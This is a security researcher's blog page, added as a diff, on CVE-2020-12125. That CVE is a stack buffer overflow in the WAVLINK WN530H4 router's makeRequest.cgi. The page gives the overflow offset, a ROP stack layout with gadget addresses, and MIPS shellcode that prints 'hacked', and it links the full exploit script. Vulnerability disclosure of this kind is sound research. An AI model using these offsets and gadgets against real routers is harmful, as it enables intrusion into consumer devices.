@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang = "en">
+    <head>
+        <!-- Google analytics -->
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-35698287-5"></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+
+            gtag('config', 'UA-35698287-5');
+        </script>
+
+        <!-- SEO Stuff -->
+        <meta charset = "utf-8">
+        <title>Christopher Cerne | CVE-2020-12125</title>
+        <meta name = "description" content = "Christopher Cerne is a computer science student, cyber security nerd, and published writer.">
+        <link rel = "canonical" href = "https://cerne.xyz" />
+
+        <!-- Temporary fix, later switch to stylesheet -->
+        <style>
+            p img {
+                /* make img responsive */
+                width: 100%;
+            }
+        </style>
+
+        <!-- Bootstrap CDN -->
+        <link rel="stylesheet" href = "https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity = "sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin = "anonymous">
+
+        <!-- FontAwesome Kit -->
+        <script src = "https://kit.fontawesome.com/616992053c.js" crossorigin = "anonymous"></script>
+
+        <!-- Make the site responsive -->
+        <meta name = "viewport" content = "width=device-width, initial-scale=1, shrink-to-fit=no">
+    </head>
+
+    <body>
+        <div class = "d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-0 bg-white border-bottom shadow-sm">
+    <h5 class = "my-0 mr-md-auto font-weight-normal">cerne.xyz</h5>
+    <nav class="my-2 my-md-0 mr-md-3">
+        <a class="p-2 text-dark" href="/pages/trophies.html">Bug Trophies</a>
+    </nav>
+    <nav class="my-2 my-md-0 mr-md-3">
+        <a class="p-2 text-dark" href="/pages/portfolio.html">Portfolio</a>
+    </nav>
+    <a class="btn btn-outline-primary" href="/">Home</a>
+</div>
+
+        <div class = "container">
+            <h1 class = "mt-5">CVE-2020-12125</h1>
+            <p>This vulnerability is a Buffer Overflow vulnerability in the WAVLINK WN530H4 router.</p>
+
+<p>There is a buffer overflow vulnerability in <kbd>/cgi-bin/makeRequest.cgi</kbd>. The overflow occurs in the main function, where it reads the <kbd>CONTENT_LENGTH</kbd> environmental variable that comes from a POST request in the browser. There is an <kbd>fgets</kbd> call at <kbd>0x406888</kbd> that reads an arbitrarily long string of size <kbd>CONTENT_LENGTH</kbd> into a fixed buffer on the stack of size 512.</p>
+
+<p>We can replicate this bug in GDB for testing purposes. As seen, the instruction pointer on the stack is overwritten with a series of “A” characters (ascii <kbd>0x41</kbd>) and the CPU attempts to jump to this address after popping it off the stack.</p>
+
+<p><img src="/assets/img/posts/2020-05-01-CVE-2020-12125-img-1.png" alt="Overrun Buffer" /></p>
+
+<p>Armed with this knowledge, we can formulate our payload. Because ASLR is enabled for libraries and for the stack, we must utilize ROP to jump to our payload. Fortunately for us, DEP is not enabled, making the stack executable.</p>
+
+<p>Return Oriented Programming (ROP) is a technique in which addresses in the program’s instruction memory are utilized to perform an attack. This is useful for when ASLR only randomizes stack space and not instruction space, like in this case. ROP is generally more useful with larger binaries, which is the case for the makeRequest.cgi binary.</p>
+
+<p>In this case, we will use ROP to jump to the stack. To do this, we need to find special sections of code, called “gadgets” that perform useful tasks. I am trying to find a sequence of gadgets that allow us to jump to a particular stack location. Fortunately, I found a sequence of gadgets that increment the stack pointer, and then jump to a location on the stack that we control.</p>
+
+<p>To craft this attack, we must place addresses on the stack in specific locations. Fortunately, we can predict what the stack will look like. We know that 564 characters can overflow the buffer before the first return pointer is overwritten. Additionally, the stack pointer will point to the first four bytes after the return address is overwritten. Essentially, we will have to craft an attack that looks like the table below.</p>
+
+<p>Please note that this payload is sloppy, doesn’t land 100% of the time, and can certainly be improved. This is mainly for proof of concept demonstration.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Location</th>
+      <th>Size</th>
+      <th>Description</th>
+      <th>Data</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0</td>
+      <td>0x11A bytes</td>
+      <td>Payload</td>
+      <td>…</td>
+    </tr>
+    <tr>
+      <td>0x11A</td>
+      <td>0x11A bytes</td>
+      <td>Data and padding</td>
+      <td>hacked\x0a</td>
+    </tr>
+    <tr>
+      <td>0x234</td>
+      <td>0x04 bytes</td>
+      <td>The address of the first gadget</td>
+      <td>0x4050d8</td>
+    </tr>
+    <tr>
+      <td>0x238 ($sp)</td>
+      <td>0x94 bytes</td>
+      <td>Aligning the next address</td>
+      <td>“A”*0x94</td>
+    </tr>
+    <tr>
+      <td>0x2CC ($sp+0x94)</td>
+      <td>0x04 bytes</td>
+      <td>The address of the second gadget</td>
+      <td>0x40214c</td>
+    </tr>
+    <tr>
+      <td>0x2D0 ($sp+0x98)</td>
+      <td>0x20 bytes</td>
+      <td>Aligning the next address</td>
+      <td>“A”*0x20</td>
+    </tr>
+    <tr>
+      <td>0x2F0 ($sp+0xB8)</td>
+      <td>0x18 bytes</td>
+      <td>We can only run 6 instructions.</td>
+      <td>…</td>
+    </tr>
+    <tr>
+      <td>0x308 ($sp+0xD0)</td>
+      <td>0x04 bytes</td>
+      <td>The stack address to jump to</td>
+      <td>(predetermined at runtime)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>As noted in the table, there are two ROP gadgets. The first is at address <kbd>0x4050d8</kbd> and the second is at <kbd>0x40214c</kbd></p>
+
+<p>First gadget at <kbd>0x4050d8</kbd></p>
+
+<pre>
+<code>
+lw      $ra, 0x94($sp)
+lw      $s2, 0x90($sp)
+lw      $s1, 0x8C($sp)
+lw      $s0, 0x88($sp)
+jr      $ra
+addiu   $sp, $sp, 0x98
+</code>
+</pre>
+
+<p>Second gadget at <kbd>0x40214c</kbd></p>
+
+<pre>
+<code>
+lw      $ra, 0x38($sp)
+lw      $s3, 0x34($sp)
+lw      $s2, 0x30($sp)
+lw      $s1, 0x2C($sp)
+lw      $s0, 0x28($sp)
+jr      $ra
+addiu   $sp, $sp, 0x40
+</code>
+</pre>
+
+<p>Next, we have to come up with an adequate payload. At <kbd>0x2F0</kbd>, we will construct a payload that jumps to a bigger area on the stack that we control, shown below.</p>
+
+<pre>
+<code>
+addiu   $ra,$ra,-752
+jr      $ra
+</code>
+</pre>
+
+<p>At this point, the CPU jumped to the location of our real payload. The attack payload simply writes 7 bytes <kbd>hacked\a</kbd> to standard out (fd 1). It additionally allows for up to 1000 bytes to be written to standard out, allowing the attacker to increase their payload size. The code for this attack is seen below.</p>
+
+<pre>
+<code>
+addiu   $sp, $ra, 0x11A
+li      $v0, 4004
+li      $a0, 1
+move    $a1, $sp
+li      $a2, 1000
+syscall                 ; write(1, $sp, 1000)
+nop
+nop
+li      $v0, 4001
+xor     $a0, $a0, $a0
+syscall                 ; exit(0)
+nop
+nop
+</code>
+</pre>
+
+<p>After compiling the payload, we can submit it as data to the web-server under the <kbd>makeRequest.cgi</kbd> endpoint. Unfortunately, the code does not execute with certainty 100% of the time. I believe this is due to the stack address that the program attempts to jump to; it may not be completely deterministic. However, we can execute the payload more than once if we encapsulate it in a script.</p>
+
+<p>Below we show the attack in action. Of course, a nefarious user could change the shellcode to be even worse.</p>
+
+<p><img src="/assets/img/posts/2020-05-01-CVE-2020-12125-img-2.png" alt="Attack" /></p>
+
+<p>The final script is located on my <a href="https://github.com/cernec1999/WAVLINK-Exploits/blob/master/overflow.py">GitHub</a>.</p>
+
+<p>For more information and vulnerability analysis, please see <a href="/assets/reports/report_wavlink.pdf">my report on the WAVLINK WN530H4</a>.</p>
+
+        </div>
+
+        <!-- Silly hack to add table class to table -->
+        <!-- Will remove once adding bootstrap to npm -->
+        <script>
+        window.onload = function() {
+            var tables = document.getElementsByTagName("table"),
+                len = tables !== null ? tables.length : 0,
+                i = 0;
+            for (i; i < len; i++) {
+                tables[i].className += " table"; 
+            }
+}
+        </script>
+
+        <footer class = "pt-md-5 border-top p-3 p-md-5 m-md-3">
+    <div class = "row">
+        <div class = "col-8 col-md">
+        <ul class = "list-unstyled text-small">
+            <li>
+                Christopher Cerne © 2020
+            </li>
+        </ul>
+        </div>
+        <div class = "col-8 col-md">
+            <h5>Contact</h5>
+            <ul class = "list-unstyled text-small">
+                <li>
+                    <a class = "text-primary" href="#"><i class = "fas fa-paper-plane"></i> <span id = "econtact">chris (AT) cerne (DOT) xyz</span></a>
+                </li>
+            </ul>
+        </div>
+        <div class = "col-8 col-md">
+            <h5>Social</h5>
+            <ul class = "list-unstyled text-small">
+                <li><a class = "text-primary" href = "https://github.com/cernec1999"  target = "_blank"><i class = "fab fa-github"></i> cernec1999</a></li>
+                <li><a class = "text-primary" href = "https://linkedin.com/in/cernec1999"  target = "_blank"><i  class = "fab fa-linkedin"  target = "_blank"></i> cernec1999</a></li>
+            </ul>
+        </div>
+
+        <div class = "col-8 col-md">
+            <h5>Business</h5>
+            <ul class = "list-unstyled text-small">
+                <li><a class = "text-primary" href = "/res/resume-rev-2.pdf" target = "_blank"><i class = "fas fa-file"></i> Resume</a></li>
+            </ul>
+        </div>
+    </div>
+</footer>
+
+<!-- More Bootstrap content -->
+<script src = "https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity = "sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin = "anonymous"></script>
+<script src = "https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity = "sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin = "anonymous"></script>
+<script src = "https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity = "sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin = "anonymous"></script>
+
+<!-- Prevent crawlers from spamming by obfuscating email -->
+<script type = "text/javascript">
+    var name = "chris";
+    var domain = "cerne";
+    var tld = "xyz";
+
+    var mail = name + String.fromCharCode(64) + domain + String.fromCharCode(46) + tld;
+
+    var link = "mail" + "to" + ":" + mail;
+    var alink = "<a href = \"" + link  + "\">" + mail + "</a>";
+    document.getElementById("econtact").innerHTML = alink;
+</script>
+
+    </body>
+</html>
